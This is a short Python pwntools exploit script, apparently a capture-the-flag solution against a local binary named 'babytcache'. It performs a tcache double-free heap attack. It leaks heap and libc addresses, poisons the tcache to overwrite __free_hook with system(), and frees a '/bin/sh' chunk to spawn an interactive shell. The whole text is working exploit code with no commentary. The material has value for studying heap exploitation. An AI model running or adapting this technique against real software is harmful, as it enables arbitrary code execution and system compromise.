from pwn import *
p=process('./babytcache')
elf = ELF('./babytcache')
libc= ELF('./libc3.so')
def add(data):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('message')
	p.send(data)

def dele(index):
	p.recvuntil('>>')
	p.sendline('2')
	p.recvuntil('index')
	p.sendline(str(index))

for i in range(15):
	add('/bin/sh\n')

dele(0)
dele(0)
dele(0)
raw_input()
p.recvuntil('>>')
p.sendline('3')
p.recvuntil('index:')
p.sendline('0')
heap  = u64(p.recv(6).ljust(8,'\x00'))
info("heap:0x%x",heap)
add(p64(heap-0x260+0x430)+'\n')
add(p64(0)+p64(0xc1))
add(p64(0)+p64(0xc1))
for i in range(8):
	dele(10)


p.recvuntil('>>')
p.sendline('3')
p.recvuntil('index:')
p.sendline('10')
addr  = u64(p.recv(6).ljust(8,'\x00'))
libc_base = addr - (0x00007f7c48baaca0-0x7f7c487bf000)
info("libc:0x%x",libc_base)
free_hook  = libc_base + libc.symbols['__free_hook']
sys = libc_base + libc.symbols['system']


dele(1)
dele(1)
add(p64(free_hook)+'\n')
add(p64(free_hook)+'\n')
add(p64(sys)+'\n')
dele(3)
p.interactive()
